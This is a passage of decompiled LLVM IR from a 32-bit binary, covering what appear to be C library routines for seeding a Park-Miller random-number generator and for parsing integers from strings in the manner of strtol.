dec_label_pc_804e5e6:                             ; preds = %dec_label_pc_804e5c5
  %v1_804e5e6 = load i32, i32* %edi.global-to-local, align 4
  %v7_804e5e6 = icmp ult i32 %v1_804e5dd, %v1_804e5e6
  br i1 %v7_804e5e6, label %dec_label_pc_804e5ec, label %dec_label_pc_804e5ea

dec_label_pc_804e5ea:                             ; preds = %dec_label_pc_804e5e6
  %v0_804e5ea = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804e5ea, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e5ec

dec_label_pc_804e5ec:                             ; preds = %dec_label_pc_804e5e6, %dec_label_pc_804e5e2, %dec_label_pc_804e5ea
  %v0_804e5ec = load i32, i32* %edx.global-to-local, align 4
  %v1_804e5ec = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e5ec = inttoptr i32 %v1_804e5ec to i32*
  store i32 %v0_804e5ec, i32* %v2_804e5ec, align 4
  %v0_804e5ee = load i32, i32* %eax.global-to-local, align 4
  %v1_804e5ee = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e5ee = add i32 %v1_804e5ee, 4
  %v3_804e5ee = inttoptr i32 %v2_804e5ee to i32*
  store i32 %v0_804e5ee, i32* %v3_804e5ee, align 4
  br label %dec_label_pc_804e5f1

dec_label_pc_804e5f1:                             ; preds = %dec_label_pc_804e5ae, %dec_label_pc_804e5ec
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804e5f3 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e5f3, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804e5b9, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804e5f1, { 1, 0 }
  uselistorder label %dec_label_pc_804e5ec, { 2, 0, 1 }
}

define i32 @function_804e5f8(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804e5f8:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_804e5f8 = load i32, i32* @ebp, align 4
  %v0_804e5f9 = load i32, i32* @edi, align 4
  %v0_804e5fa = load i32, i32* @esi, align 4
  %v0_804e5fb = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_804e606 = trunc i64 %arg1 to i32
  store i32 %v4_804e606, i32* %eax.global-to-local, align 4
  %v1_804e60a = add i32 %arg2, 12
  %v2_804e60a = inttoptr i32 %v1_804e60a to i32*
  %v3_804e60a = load i32, i32* %v2_804e60a, align 4
  store i32 %v3_804e60a, i32* %edx.global-to-local, align 4
  %v6_804e610 = icmp ugt i32 %v3_804e60a, 4
  br i1 %v6_804e610, label %dec_label_pc_804e684, label %dec_label_pc_804e612

dec_label_pc_804e612:                             ; preds = %dec_label_pc_804e5f8
  %v1_804e612 = add i32 %arg2, 8
  %v2_804e612 = inttoptr i32 %v1_804e612 to i32*
  %v3_804e612 = load i32, i32* %v2_804e612, align 4
  store i32 %v3_804e612, i32* %ebx.global-to-local, align 4
  %v1_804e615 = icmp eq i32 %v4_804e606, 0
  %v1_804e617 = icmp eq i1 %v1_804e615, false
  br i1 %v1_804e617, label %dec_label_pc_804e61b, label %dec_label_pc_804e619

dec_label_pc_804e619:                             ; preds = %dec_label_pc_804e612
  %v1_804e619 = and i32 %v4_804e606, -256
  %v2_804e619 = or i32 %v1_804e619, 1
  store i32 %v2_804e619, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e61b

dec_label_pc_804e61b:                             ; preds = %dec_label_pc_804e612, %dec_label_pc_804e619
  %v0_804e61b = phi i32 [ %v4_804e606, %dec_label_pc_804e612 ], [ %v2_804e619, %dec_label_pc_804e619 ]
  %v2_804e61b = inttoptr i32 %v3_804e612 to i32*
  store i32 %v0_804e61b, i32* %v2_804e61b, align 4
  %v1_804e61d = icmp eq i32 %v3_804e60a, 0
  br i1 %v1_804e61d, label %dec_label_pc_804e682, label %dec_label_pc_804e621

dec_label_pc_804e621:                             ; preds = %dec_label_pc_804e61b
  %v0_804e621 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804e621, i32* %edx.global-to-local, align 4
  %v0_804e623 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804e623, i32* %ecx.global-to-local, align 4
  %v0_804e625 = load i32, i32* @esi, align 4
  %v1_804e625 = add i32 %v0_804e625, 16
  %v2_804e625 = inttoptr i32 %v1_804e625 to i32*
  %v3_804e625 = load i32, i32* %v2_804e625, align 4
  store i32 %v3_804e625, i32* %eax.global-to-local, align 4
  %v4_804e62d = sext i32 %v3_804e625 to i64
  store i64 %v4_804e62d, i64* %stack_var_-40, align 8
  %v5_804e65f27 = icmp sgt i32 %v3_804e625, 1
  br i1 %v5_804e65f27, label %dec_label_pc_804e632, label %dec_label_pc_804e661

dec_label_pc_804e632:                             ; preds = %dec_label_pc_804e621, %dec_label_pc_804e632.dec_label_pc_804e632_crit_edge
  %v0_804e656 = phi i32 [ %v0_804e656.pre, %dec_label_pc_804e632.dec_label_pc_804e632_crit_edge ], [ %v0_804e623, %dec_label_pc_804e621 ]
  %v0_804e632 = phi i32 [ %v0_804e632.pre, %dec_label_pc_804e632.dec_label_pc_804e632_crit_edge ], [ %v0_804e621, %dec_label_pc_804e621 ]
  %v0_804e65928 = phi i32 [ %v0_804e65c.pre, %dec_label_pc_804e632.dec_label_pc_804e632_crit_edge ], [ 1, %dec_label_pc_804e621 ]
  %v1_804e639 = ashr i32 %v0_804e632, 31
  %v2_804e63a = zext i32 %v0_804e632 to i64
  %v4_804e63a = zext i32 %v1_804e639 to i64
  %v5_804e63a = mul nuw i64 %v4_804e63a, 4294967296
  %v6_804e63a = or i64 %v5_804e63a, %v2_804e63a
  %v8_804e63a = sdiv i64 %v6_804e63a, 127773
  %v9_804e63a = trunc i64 %v8_804e63a to i32
  %v10_804e63a = srem i64 %v6_804e63a, 127773
  %v3_804e640 = mul nsw i64 %v10_804e63a, 16807
  %v4_804e640 = trunc i64 %v3_804e640 to i32
  %v3_804e646 = mul i32 %v9_804e63a, 2836
  store i32 %v3_804e646, i32* %eax.global-to-local, align 4
  %v2_804e64c = sub i32 %v4_804e640, %v3_804e646
  %v13_804e64c = icmp slt i32 %v2_804e64c, 0
  %v1_804e64e = icmp eq i1 %v13_804e64c, false
  %v1_804e650 = add i32 %v2_804e64c, 2147483647
  %v2_804e64c.v1_804e650 = select i1 %v1_804e64e, i32 %v2_804e64c, i32 %v1_804e650
  store i32 %v2_804e64c.v1_804e650, i32* %edx.global-to-local, align 4
  %v1_804e656 = add i32 %v0_804e656, 4
  store i32 %v1_804e656, i32* %ecx.global-to-local, align 4
  %v1_804e659 = add i32 %v0_804e65928, 1
  store i32 %v1_804e659, i32* @edi, align 4
  %v2_804e65a = inttoptr i32 %v1_804e656 to i32*
  store i32 %v2_804e64c.v1_804e650, i32* %v2_804e65a, align 4
  %v0_804e65c.pre = load i32, i32* @edi, align 4
  %v3_804e65c.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_804e65c.pre to i32
  %v5_804e65f = icmp slt i32 %v0_804e65c.pre, %extract.t12
  br i1 %v5_804e65f, label %dec_label_pc_804e632.dec_label_pc_804e632_crit_edge, label %dec_label_pc_804e65c.dec_label_pc_804e661_crit_edge

dec_label_pc_804e632.dec_label_pc_804e632_crit_edge: ; preds = %dec_label_pc_804e632
  %v0_804e632.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_804e656.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e632

dec_label_pc_804e65c.dec_label_pc_804e661_crit_edge: ; preds = %dec_label_pc_804e632
  %v0_804e661.pre = load i32, i32* @esi, align 4
  %v0_804e664.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e661

dec_label_pc_804e661:                             ; preds = %dec_label_pc_804e65c.dec_label_pc_804e661_crit_edge, %dec_label_pc_804e621
  %v0_804e664 = phi i32 [ %v0_804e664.pre, %dec_label_pc_804e65c.dec_label_pc_804e661_crit_edge ], [ %v0_804e623, %dec_label_pc_804e621 ]
  %v0_804e661 = phi i32 [ %v0_804e661.pre, %dec_label_pc_804e65c.dec_label_pc_804e661_crit_edge ], [ %v0_804e625, %dec_label_pc_804e621 ]
  %v1_804e661 = add i32 %v0_804e661, 20
  %v2_804e661 = inttoptr i32 %v1_804e661 to i32*
  %v3_804e661 = load i32, i32* %v2_804e661, align 4
  store i32 %v3_804e661, i32* %eax.global-to-local, align 4
  %v2_804e664 = add i32 %v0_804e661, 4
  %v3_804e664 = inttoptr i32 %v2_804e664 to i32*
  store i32 %v0_804e664, i32* %v3_804e664, align 4
  %v0_804e667 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e667 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e667 = mul i32 %v1_804e667, 4
  %v3_804e667 = add i32 %v2_804e667, %v0_804e667
  store i32 %v3_804e667, i32* %eax.global-to-local, align 4
  %v1_804e66a = load i32, i32* @esi, align 4
  %v2_804e66a = inttoptr i32 %v1_804e66a to i32*
  store i32 %v3_804e667, i32* %v2_804e66a, align 4
  %v3_804e66c = load i64, i64* %stack_var_-40, align 8
  %v6_804e66c = mul nsw i64 %v3_804e66c, 10
  %v7_804e66c = trunc i64 %v6_804e66c to i32
  %v2_804e672 = ptrtoint i32* %stack_var_-20 to i32
  %v1_804e67f24 = add i32 %v7_804e66c, -1
  %v9_804e67f25 = icmp slt i32 %v1_804e67f24, 0
  store i32 %v1_804e67f24, i32* @ebx, align 4
  %v1_804e68026 = icmp eq i1 %v9_804e67f25, false
  br i1 %v1_804e68026, label %dec_label_pc_804e672, label %dec_label_pc_804e682

dec_label_pc_804e672:                             ; preds = %dec_label_pc_804e661, %dec_label_pc_804e672
  store i32 %v2_804e672, i32* %eax.global-to-local, align 4
  %v0_804e677 = load i32, i32* @esi, align 4
  %v2_804e678 = inttoptr i32 %v0_804e677 to i32*
  %v3_804e678 = call i32 @function_804e599(i32* %v2_804e678, i32 %v2_804e672)
  store i32 %v0_804e677, i32* %eax.global-to-local, align 4
  store i32 %v2_804e672, i32* %edx.global-to-local, align 4
  %v0_804e67f.pre = load i32, i32* @ebx, align 4
  %v1_804e67f = add i32 %v0_804e67f.pre, -1
  %v9_804e67f = icmp slt i32 %v1_804e67f, 0
  store i32 %v1_804e67f, i32* @ebx, align 4
  %v1_804e680 = icmp eq i1 %v9_804e67f, false
  br i1 %v1_804e680, label %dec_label_pc_804e672, label %dec_label_pc_804e682

dec_label_pc_804e682:                             ; preds = %dec_label_pc_804e661, %dec_label_pc_804e672, %dec_label_pc_804e61b
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e684

dec_label_pc_804e684:                             ; preds = %dec_label_pc_804e5f8, %dec_label_pc_804e682
  %v0_804e687 = phi i32 [ -1, %dec_label_pc_804e5f8 ], [ 0, %dec_label_pc_804e682 ]
  store i32 %v0_804e687, i32* %eax.global-to-local, align 4
  store i32 %v0_804e5fb, i32* @ebx, align 4
  store i32 %v0_804e5fa, i32* @esi, align 4
  store i32 %v0_804e5f9, i32* @edi, align 4
  store i32 %v0_804e5f8, i32* @ebp, align 4
  ret i32 %v0_804e687

; uselistorder directives
  uselistorder i32 %v0_804e687, { 1, 0 }
  uselistorder i32 %v1_804e67f, { 1, 0 }
  uselistorder i32 %v0_804e661, { 1, 0 }
  uselistorder i32 %v0_804e65c.pre, { 1, 0 }
  uselistorder i32 %v2_804e64c.v1_804e650, { 1, 0 }
  uselistorder i32 %v0_804e632, { 1, 0 }
  uselistorder i32 %v0_804e623, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e684, { 1, 0 }
  uselistorder label %dec_label_pc_804e682, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e672, { 1, 0 }
  uselistorder label %dec_label_pc_804e632, { 1, 0 }
  uselistorder label %dec_label_pc_804e61b, { 1, 0 }
}

define i32 @function_804e68e(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804e68e:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_804e691 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_804e6b2, label %dec_label_pc_804e6a6

dec_label_pc_804e6a6:                             ; preds = %dec_label_pc_804e68e
  %v2_804e6a6 = icmp ult i32 %arg3, 256
  %v1_804e6ad = select i1 %v2_804e6a6, i32 5, i32 4
  store i32 %v1_804e6ad, i32* @ebx, align 4
  br label %dec_label_pc_804e6c8

dec_label_pc_804e6b2:                             ; preds = %dec_label_pc_804e68e
  %v6_804e6b5 = icmp ugt i32 %arg3, 31
  br i1 %v6_804e6b5, label %dec_label_pc_804e6c0, label %dec_label_pc_804e6b7

dec_label_pc_804e6b7:                             ; preds = %dec_label_pc_804e6b2
  store i32 0, i32* @ebx, align 4
  %v6_804e6bc = icmp ugt i32 %arg3, 7
  br i1 %v6_804e6bc, label %dec_label_pc_804e6c8, label %dec_label_pc_804e718

dec_label_pc_804e6c0:                             ; preds = %dec_label_pc_804e6b2
  %v2_804e6c0 = icmp ult i32 %arg3, 64
  %v1_804e6c5 = select i1 %v2_804e6c0, i32 3, i32 2
  store i32 %v1_804e6c5, i32* @ebx, align 4
  br label %dec_label_pc_804e6c8

dec_label_pc_804e6c8:                             ; preds = %dec_label_pc_804e6b7, %dec_label_pc_804e6a6, %dec_label_pc_804e6c0
  %v0_804e6c8 = phi i32 [ 0, %dec_label_pc_804e6b7 ], [ %v1_804e6ad, %dec_label_pc_804e6a6 ], [ %v1_804e6c5, %dec_label_pc_804e6c0 ]
  %v1_804e6c8 = mul nuw nsw i32 %v0_804e6c8, 4
  %v2_804e6c8 = add i32 %v1_804e6c8, ptrtoint (i32* @global_var_8053c54.167 to i32)
  %v3_804e6c8 = inttoptr i32 %v2_804e6c8 to i32*
  %v4_804e6c8 = load i32, i32* %v3_804e6c8, align 4
  store i32 %v4_804e6c8, i32* %eax.global-to-local, align 4
  %v1_804e6cf = add i32 %tmp7, 4
  store i32 %v1_804e6cf, i32* @esi, align 4
  %v2_804e6d2 = add i32 %arg4, 16
  %v3_804e6d2 = inttoptr i32 %v2_804e6d2 to i32*
  store i32 %v4_804e6c8, i32* %v3_804e6d2, align 4
  %v0_804e6d5 = load i32, i32* @ebx, align 4
  %v1_804e6d5 = mul i32 %v0_804e6d5, 4
  %v2_804e6d5 = add i32 %v1_804e6d5, ptrtoint (i32* @global_var_8053c40.168 to i32)
  %v3_804e6d5 = inttoptr i32 %v2_804e6d5 to i32*
  %v4_804e6d5 = load i32, i32* %v3_804e6d5, align 4
  store i32 %v4_804e6d5, i32* %edx.global-to-local, align 4
  %v0_804e6dc = load i32, i32* @esi, align 4
  %v1_804e6dc = load i32, i32* %eax.global-to-local, align 4
  %v2_804e6dc = mul i32 %v1_804e6dc, 4
  %v3_804e6dc = add i32 %v2_804e6dc, %v0_804e6dc
  store i32 %v3_804e6dc, i32* %eax.global-to-local, align 4
  %v1_804e6df = load i32, i32* @edi, align 4
  %v2_804e6df = add i32 %v1_804e6df, 12
  %v3_804e6df = inttoptr i32 %v2_804e6df to i32*
  store i32 %v0_804e6d5, i32* %v3_804e6df, align 4
  %v0_804e6e2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e6e2 = load i32, i32* @edi, align 4
  %v2_804e6e2 = add i32 %v1_804e6e2, 20
  %v3_804e6e2 = inttoptr i32 %v2_804e6e2 to i32*
  store i32 %v0_804e6e2, i32* %v3_804e6e2, align 4
  %v0_804e6e5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e6e5 = load i32, i32* @edi, align 4
  %v2_804e6e5 = add i32 %v1_804e6e5, 24
  %v3_804e6e5 = inttoptr i32 %v2_804e6e5 to i32*
  store i32 %v0_804e6e5, i32* %v3_804e6e5, align 4
  %v0_804e6e8 = load i32, i32* @esi, align 4
  %v1_804e6e8 = load i32, i32* @edi, align 4
  %v2_804e6e8 = add i32 %v1_804e6e8, 8
  %v3_804e6e8 = inttoptr i32 %v2_804e6e8 to i32*
  store i32 %v0_804e6e8, i32* %v3_804e6e8, align 4
  %v0_804e6eb = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_804e6f0 = sext i32 %arg1 to i64
  %v3_804e6f0 = call i32 @function_804e5f8(i64 %v2_804e6f0, i32 %v0_804e6eb)
  %v0_804e6f5 = load i32, i32* @ebp, align 4
  %v1_804e6f5 = inttoptr i32 %v0_804e6f5 to i32*
  store i32 0, i32* %v1_804e6f5, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804e700 = load i32, i32* @ebx, align 4
  %v1_804e700 = icmp eq i32 %v0_804e700, 0
  br i1 %v1_804e700, label %dec_label_pc_804e731, label %dec_label_pc_804e704

dec_label_pc_804e704:                             ; preds = %dec_label_pc_804e6c8
  %v0_804e704 = load i32, i32* @edi, align 4
  %v1_804e704 = add i32 %v0_804e704, 4
  %v2_804e704 = inttoptr i32 %v1_804e704 to i32*
  %v3_804e704 = load i32, i32* %v2_804e704, align 4
  %v1_804e707 = load i32, i32* @esi, align 4
  %v2_804e707 = sub i32 %v3_804e704, %v1_804e707
  %v2_804e709 = sdiv i32 %v2_804e707, 4
  %v3_804e70c = mul i32 %v2_804e709, 5
  %v2_804e70f = add i32 %v3_804e70c, %v0_804e700
  %v1_804e711 = load i32, i32* @ebp, align 4
  %v2_804e711 = inttoptr i32 %v1_804e711 to i32*
  store i32 %v2_804e70f, i32* %v2_804e711, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e731

dec_label_pc_804e718:                             ; preds = %dec_label_pc_804e6b7
  %v1_804e718 = call i32 @function_804b4bc(i32 %v0_804e691)
  store i32 %v1_804e718, i32* %eax.global-to-local, align 4
  %v1_804e71d = inttoptr i32 %v1_804e718 to i32*
  store i32 22, i32* %v1_804e71d, align 4
  %v0_804e723 = load i32, i32* %stack_var_-36, align 4
  %v1_804e723 = call i32 @function_804b4bc(i32 %v0_804e723)
  %v1_804e728 = inttoptr i32 %v1_804e723 to i32*
  store i32 22, i32* %v1_804e728, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e731

dec_label_pc_804e731:                             ; preds = %dec_label_pc_804e6c8, %dec_label_pc_804e704, %dec_label_pc_804e718
  %v0_804e738 = phi i32 [ 0, %dec_label_pc_804e6c8 ], [ 0, %dec_label_pc_804e704 ], [ -1, %dec_label_pc_804e718 ]
  ret i32 %v0_804e738

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e731, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e6c8, { 2, 0, 1 }
}

define i32 @function_804e73c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e73c:
  %v3_804e747 = call i32 @function_804e750(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_804e747
}

define i32 @function_804e750(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804e750:
  %v4_804e761 = inttoptr i32 %arg1 to i8*
  %v5_804e761 = call i32 @function_804e76c(i8* %v4_804e761, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_804e761
}

define i32 @function_804e76c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804e76c:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_804e76f = load i32, i32* @ebx, align 4
  store i32 %v0_804e76f, i32* %stack_var_-16, align 4
  %v0_804e773 = load i32, i32* @global_var_80559e0, align 32
  store i32 %v0_804e773, i32* %edx.global-to-local, align 4
  %v4_804e779 = ptrtoint i8* %arg1 to i32
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_804e779, i32* %ebx.global-to-local, align 4
  %v2_804e78640 = load i8, i8* %arg1, align 1
  %v3_804e78641 = sext i8 %v2_804e78640 to i32
  store i32 %v3_804e78641, i32* %eax.global-to-local, align 4
  %v2_804e78942 = mul nsw i32 %v3_804e78641, 2
  %v3_804e78943 = add i32 %v2_804e78942, %v0_804e773
  %v4_804e78944 = inttoptr i32 %v3_804e78943 to i8*
  %v5_804e78945 = load i8, i8* %v4_804e78944, align 1
  %v6_804e78946 = and i8 %v5_804e78945, 32
  %v7_804e78947 = icmp eq i8 %v6_804e78946, 0
  %v1_804e78d48 = icmp eq i1 %v7_804e78947, false
  br i1 %v1_804e78d48, label %dec_label_pc_804e785, label %dec_label_pc_804e78f

dec_label_pc_804e785:                             ; preds = %dec_label_pc_804e76c, %dec_label_pc_804e785
  %v0_804e78549 = phi i32 [ %v1_804e785, %dec_label_pc_804e785 ], [ %v4_804e779, %dec_label_pc_804e76c ]
  %v1_804e785 = add i32 %v0_804e78549, 1
  store i32 %v1_804e785, i32* %ebx.global-to-local, align 4
  %v1_804e786 = inttoptr i32 %v1_804e785 to i8*
  %v2_804e786 = load i8, i8* %v1_804e786, align 1
  %v3_804e786 = sext i8 %v2_804e786 to i32
  store i32 %v3_804e786, i32* %eax.global-to-local, align 4
  %v2_804e789 = mul nsw i32 %v3_804e786, 2
  %v3_804e789 = add i32 %v2_804e789, %v0_804e773
  %v4_804e789 = inttoptr i32 %v3_804e789 to i8*
  %v5_804e789 = load i8, i8* %v4_804e789, align 1
  %v6_804e789 = and i8 %v5_804e789, 32
  %v7_804e789 = icmp eq i8 %v6_804e789, 0
  %v1_804e78d = icmp eq i1 %v7_804e789, false
  br i1 %v1_804e78d, label %dec_label_pc_804e785, label %dec_label_pc_804e78f

dec_label_pc_804e78f:                             ; preds = %dec_label_pc_804e785, %dec_label_pc_804e76c
  %v0_804e785.lcssa = phi i32 [ %v4_804e779, %dec_label_pc_804e76c ], [ %v1_804e785, %dec_label_pc_804e785 ]
  %v2_804e786.lcssa = phi i8 [ %v2_804e78640, %dec_label_pc_804e76c ], [ %v2_804e786, %dec_label_pc_804e785 ]
  %v3_804e786.lcssa = phi i32 [ %v3_804e78641, %dec_label_pc_804e76c ], [ %v3_804e786, %dec_label_pc_804e785 ]
  %tmp36 = trunc i32 %arg4 to i8
  %v9_804e78f = icmp eq i8 %v2_804e786.lcssa, 43
  br i1 %v9_804e78f, label %dec_label_pc_804e7a4, label %dec_label_pc_804e794

dec_label_pc_804e794:                             ; preds = %dec_label_pc_804e78f
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_804e796 = icmp eq i8 %v2_804e786.lcssa, 45
  %v1_804e799 = icmp eq i1 %v9_804e796, false
  br i1 %v1_804e799, label %dec_label_pc_804e7a5, label %dec_label_pc_804e7a4

dec_label_pc_804e7a4:                             ; preds = %dec_label_pc_804e78f, %dec_label_pc_804e794
  %storemerge2 = phi i32 [ 1, %dec_label_pc_804e794 ], [ 0, %dec_label_pc_804e78f ]
  store i32 %storemerge2, i32* %ebp.global-to-local, align 4
  %v1_804e7a4 = add i32 %v0_804e785.lcssa, 1
  store i32 %v1_804e7a4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e7a5

dec_label_pc_804e7a5:                             ; preds = %dec_label_pc_804e794, %dec_label_pc_804e7a4
  %v0_804e7b7 = phi i32 [ %v0_804e785.lcssa, %dec_label_pc_804e794 ], [ %v1_804e7a4, %dec_label_pc_804e7a4 ]
  %v1_804e7a7 = and i32 %arg3, -17
  %v2_804e7a7 = icmp eq i32 %v1_804e7a7, 0
  %v1_804e7ad = icmp eq i1 %v2_804e7a7, false
  br i1 %v1_804e7ad, label %dec_label_pc_804e7d3, label %dec_label_pc_804e7af

dec_label_pc_804e7af:                             ; preds = %dec_label_pc_804e7a5
  %v1_804e7af = add i32 %arg3, 10
  store i32 %v1_804e7af, i32* %esi.global-to-local, align 4
  %v1_804e7b2 = inttoptr i32 %v0_804e7b7 to i8*
  %v2_804e7b2 = load i8, i8* %v1_804e7b2, align 1
  %v8_804e7b2 = icmp eq i8 %v2_804e7b2, 48
  %v1_804e7b5 = icmp eq i1 %v8_804e7b2, false
  br i1 %v1_804e7b5, label %dec_label_pc_804e7c9, label %dec_label_pc_804e7b7

dec_label_pc_804e7b7:                             ; preds = %dec_label_pc_804e7af
  %v1_804e7b7 = add i32 %v0_804e7b7, 1
  store i32 %v1_804e7b7, i32* %ebx.global-to-local, align 4
  %v1_804e7b8 = add i32 %arg3, 8
  store i32 %v1_804e7b8, i32* %esi.global-to-local, align 4
  %v1_804e7bd = inttoptr i32 %v1_804e7b7 to i8*
  %v2_804e7bd = load i8, i8* %v1_804e7bd, align 1
  %v3_804e7bd = zext i8 %v2_804e7bd to i32
  %v5_804e7bd = and i32 %v3_804e786.lcssa, -256
  %v6_804e7bd = or i32 %v5_804e7bd, %v3_804e7bd
  %v1_804e7bf = or i32 %v6_804e7bd, 32
  %v3_804e7bf = trunc i32 %v1_804e7bf to i8
  store i32 %v1_804e7bf, i32* %eax.global-to-local, align 4
  %v10_804e7c2 = icmp eq i8 %v3_804e7bf, 120
  %v1_804e7c4 = icmp eq i1 %v10_804e7c2, false
  br i1 %v1_804e7c4, label %dec_label_pc_804e7c9, label %dec_label_pc_804e7c6

dec_label_pc_804e7c6:                             ; preds = %dec_label_pc_804e7b7
  %v2_804e7c6 = mul i32 %v1_804e7b8, 2
  store i32 %v2_804e7c6, i32* %esi.global-to-local, align 4
  %v1_804e7c8 = add i32 %v0_804e7b7, 2
  store i32 %v1_804e7c8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e7c9

dec_label_pc_804e7c9:                             ; preds = %dec_label_pc_804e7b7, %dec_label_pc_804e7af, %dec_label_pc_804e7c6
  %v0_804e7f211 = phi i32 [ %v1_804e7b7, %dec_label_pc_804e7b7 ], [ %v0_804e7b7, %dec_label_pc_804e7af ], [ %v1_804e7c8, %dec_label_pc_804e7c6 ]
  %v0_804e84919 = phi i32 [ %v1_804e7b7, %dec_label_pc_804e7b7 ], [ %v4_804e779, %dec_label_pc_804e7af ], [ %v1_804e7b7, %dec_label_pc_804e7c6 ]
  %v0_804e7c9 = phi i32 [ %v1_804e7b8, %dec_label_pc_804e7b7 ], [ %v1_804e7af, %dec_label_pc_804e7af ], [ %v2_804e7c6, %dec_label_pc_804e7c6 ]
  %v7_804e7cc = icmp sgt i32 %v0_804e7c9, 16
  br i1 %v7_804e7cc, label %dec_label_pc_804e7ce, label %dec_label_pc_804e7d3

dec_label_pc_804e7ce:                             ; preds = %dec_label_pc_804e7c9
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e7d3

dec_label_pc_804e7d3:                             ; preds = %dec_label_pc_804e7c9, %dec_label_pc_804e7a5, %dec_label_pc_804e7ce
  %v0_804e84920 = phi i32 [ %v0_804e84919, %dec_label_pc_804e7c9 ], [ %v4_804e779, %dec_label_pc_804e7a5 ], [ %v0_804e84919, %dec_label_pc_804e7ce ]
  %v0_804e7f212 = phi i32 [ %v0_804e7f211, %dec_label_pc_804e7c9 ], [ %v0_804e7b7, %dec_label_pc_804e7a5 ], [ %v0_804e7f211, %dec_label_pc_804e7ce ]
  %v0_804e7e2 = phi i32 [ %v0_804e7c9, %dec_label_pc_804e7c9 ], [ %arg3, %dec_label_pc_804e7a5 ], [ 16, %dec_label_pc_804e7ce ]
  %v1_804e7d3 = add i32 %v0_804e7e2, -2
  store i32 %v1_804e7d3, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_804e7db = icmp ugt i32 %v1_804e7d3, 34
  br i1 %v6_804e7db, label %dec_label_pc_804e83e, label %dec_label_pc_804e7dd

dec_label_pc_804e7dd:                             ; preds = %dec_label_pc_804e7d3
  %div = udiv i32 -1, %v0_804e7e2
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp37 = urem i32 -1, %v0_804e7e2
  %v1_804e7e4 = trunc i32 %tmp37 to i8
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_804e81e = urem i32 %arg4, 256
  br label %dec_label_pc_804e7f2

dec_label_pc_804e7f0:                             ; preds = %dec_label_pc_804e834, %dec_label_pc_804e81e
  %v4_804e7f2.pre = phi i32 [ %v1_804e808, %dec_label_pc_804e834 ], [ %v4_804e7f2.pre.pre, %dec_label_pc_804e81e ]
